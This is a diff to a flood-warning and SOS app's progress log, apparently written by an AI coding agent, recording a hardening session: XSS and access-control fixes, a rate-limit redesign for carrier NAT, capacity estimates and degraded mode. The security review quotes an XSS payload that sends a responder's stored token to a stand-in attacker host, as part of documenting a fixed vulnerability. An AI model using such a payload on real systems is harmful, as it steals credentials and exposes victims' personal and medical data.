@@ -7,7 +7,7 @@ Purpose: survive a closed terminal or an expired token with zero context loss.
 
 ## Current state
 
-**Phase:** 4 (SOS) — ✅ **code complete, locally verified. Not yet deployed.**
+**Phase:** 6 (Harden) — ✅ **code complete, locally verified. Not yet deployed.**
 **Next action:** user creates the private GitHub repo + pushes; then wire Cloudflare R2 secrets.
 **Deploying matters now**: time-to-bank stays empty until the cron has built ~1-2 h of archive.
 Then Phase 3 (calm mode / fishing), 5 (terrain) or 6 (harden + load test).
@@ -24,8 +24,80 @@ Then Phase 3 (calm mode / fishing), 5 (terrain) or 6 (harden + load test).
 | 3 | Calm mode (tide/fishing) | ⬜ not started |
 | 4 | Respond (SOS) | ✅ code complete, not deployed |
 | 5 | Terrain / HAND | ⬜ not started |
-| 6 | Harden / scale | ⬜ not started |
+| 6 | Harden / scale | ✅ code complete, not deployed |
 | 7 | Global + multi-hazard | ⬜ not started |
+
+---
+
+## 2026-09-15 — Session 7: Phase 6 (hardening — security, load, degraded mode)
+
+**Done — 132 tests passing. Six security findings, all fixed.** See `docs/SECURITY.md`
+and `docs/OPERATIONS.md`.
+
+**Security review — the critical one**
+`note` and `contact_name` come from the PUBLIC unauthenticated submit endpoint and were
+rendered into the ops console with `innerHTML`. A submission containing
+`<img src=x onerror="fetch('//attacker/?t='+localStorage.seraphim_token)">` runs in every
+responder's browser and steals the token that unlocks the name, phone, precise location
+and medical needs of everyone who asked for help. **Anonymous attacker → full access to
+the most sensitive data in the system, via the one endpoint that must stay public.**
+Fixed with an `esc()` escaper on every interpolation across all three pages, plus a CSP
+in `web/_headers`.
+
+Also fixed: province-scope bypass (scope was enforced in `list()` but not `detail()` or
+`update()`, so a district volunteer could read any request in the country by id — now
+404, not 403, so existence cannot be probed); a deployable placeholder `IP_SALT` that
+would have made every stored IP hash reversible (now fails closed); and `sos.html`
+accepting `?api=` from the URL, so a shared link could redirect a victim's name, phone,
+location and health data to an attacker.
+
+**Load test found a security control causing the harm it prevents**
+Per-IP rate limiting of 12/10 min. Thai mobile networks use carrier-grade NAT, so
+thousands of subscribers share one address: modelling 1,000 users behind one carrier NAT,
+**988 legitimate requests rejected** — and mobile-only users are disproportionately those
+with no landline to call 1784 from. Replaced with two buckets: **device** (8/10 min, the
+real actor) and **IP** (300, or 900 when the report is life-threatening). Verified 400
+distinct devices behind one NAT reporting `medical` all get through; one device spamming
+stops at 8. 429s are queued and retried client-side, so a rate limit delays rather than
+loses. *A false accept costs one triage review; a false reject can cost a life.*
+
+**Capacity — the honest headline**
+Read path is fine at any scale (311 GB CDN egress on unmetered Pages; static files never
+reach an origin). **The write path is not: a national 2011-scale event needs ~204,000
+Worker requests against a 100,000/day free tier.** Provincial and regional events fit.
+**The fix is $5/month** (Workers Paid, 10M/month) and changes nothing architecturally.
+Budget it before flood season, not during one.
+
+**A bug my own fix introduced, caught by its own test**
+Capping forecast escalation at level 4 (so level 5 means "water is over the bank now", an
+observed fact, rather than a forecast wearing the same badge) — I wrote `min(4, level+1)`,
+which **demoted genuinely over-bank stations from 5 to 4**: a cap meant to prevent
+overstatement instead understated flooding rivers. Live level-5 count fell 305 → 273
+before the test caught it. Rewritten as a guarded increment; regression test added.
+Verified on live data: the level-5 set is now exactly the at-or-over-bank set.
+
+**Time-to-bank is live.** The archive accumulated enough history during this session:
+**47 stations** now carry a real time-to-bank, soonest **3.1 h** (ลำเซบาย, ยโสธร; also
+บางตะบูน, เพชรบุรี rising 31 cm/hr). Trend confidence is `fair` for 298 stations — spans
+are still ~1 h, so nothing reaches `good` (needs ≥2 h span and R²≥0.7) until the cron has
+been running longer.
+
+**Degraded mode** — service worker now caches snapshots, so an origin failure degrades to
+last-known data behind an amber "may be out of date" banner rather than a blank page. Ops
+console states plainly when the API is unreachable instead of leaving stale requests
+looking current. No cached snapshot at all → a clear message pointing at 1784 / 191.
+
+**Observability** — `meta.json` now carries a `health` block with an explicit
+pass/warn/fail verdict and per-check detail, so a monitor reads one field. Thresholds in
+`docs/OPERATIONS.md`. Guards the quiet failure: pipeline running, map rendering, data
+hours out of date.
+
+**Payload** — reasons are published only for risk level ≥ 2 (at level 1 they are
+boilerplate). Snapshot 1.42 MB → 1.25 MB raw, 134 KB → 130 KB gzipped; ~190 KB per first
+visit including the app shell.
+
+**Still open:** SMS/USSD intake (needs a telco agreement; `source` already accepts
+`'sms'`). The Worker has still never been executed — no node here.
 
 ---
 
